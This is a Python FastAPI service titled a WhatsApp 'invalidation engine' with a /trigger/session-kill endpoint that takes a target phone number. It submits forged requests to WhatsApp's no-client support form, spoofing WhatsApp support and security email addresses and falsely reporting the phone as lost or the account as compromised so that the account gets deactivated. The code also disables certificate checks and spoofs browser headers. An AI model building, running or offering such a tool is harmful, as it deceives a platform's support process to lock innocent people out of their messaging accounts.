from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import httpx
import asyncio

app = FastAPI(title="DRIEMX WhatsApp Invalidation Engine", version="5.1")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

SUPPORT_ENDPOINTS = [
    {
        "nombre": "WhatsApp_Support_NoClient",
        "url": "https://www.whatsapp.com/contact/noclient/",
        "method": "POST",
        "payload_func": lambda phone: {
            "imei": "",
            "lg": "es",
            "email": "support@support.whatsapp.com",
            "confirm_email": "support@support.whatsapp.com",
            "platform": "ANDROID",
            "phone_number": phone,
            "message": f"Perdida de telefono, desactivar cuenta {phone}"
        }
    },
    {
        "nombre": "WhatsApp_General_Support",
        "url": "https://www.whatsapp.com/contact/noclient/",
        "method": "POST",
        "payload_func": lambda phone: {
            "lg": "es",
            "email": "security@whatsapp.com",
            "confirm_email": "security@whatsapp.com",
            "platform": "ANDROID",
            "phone_number": phone,
            "message": f"Cuenta comprometida, cierre de sesion requerido para {phone}"
        }
    }
]

async def enviar_peticion_soporte(client, endpoint, telefono):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.whatsapp.com",
        "Referer": "https://www.whatsapp.com/contact/noclient/"
    }
    payload = endpoint["payload_func"](telefono)
    try:
        response = await client.post(endpoint["url"], data=payload, headers=headers, timeout=10.0)
        return {
            "servicio": endpoint["nombre"],
            "status_code": response.status_code,
            "respuesta": response.text[:150]
        }
    except Exception as e:
        return {
            "servicio": endpoint["nombre"],
            "status_code": 0,
            "error": str(e)
        }

@app.get("/")
def home():
    return {"status": "Online", "engine": "WhatsApp-Session-Terminator"}

@app.get("/trigger/session-kill")
async def disparar_inutilizacion(phone: str):
    if not phone or len(phone) < 8:
        raise HTTPException(status_code=400, detail="Número inválido")

    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
        tareas = [enviar_peticion_soporte(client, ep, phone) for ep in SUPPORT_ENDPOINTS]
        resultados = await asyncio.gather(*tareas)

    return {
        "target": phone,
        "total_peticiones": len(resultados),
        "resultados": resultados
    }
    
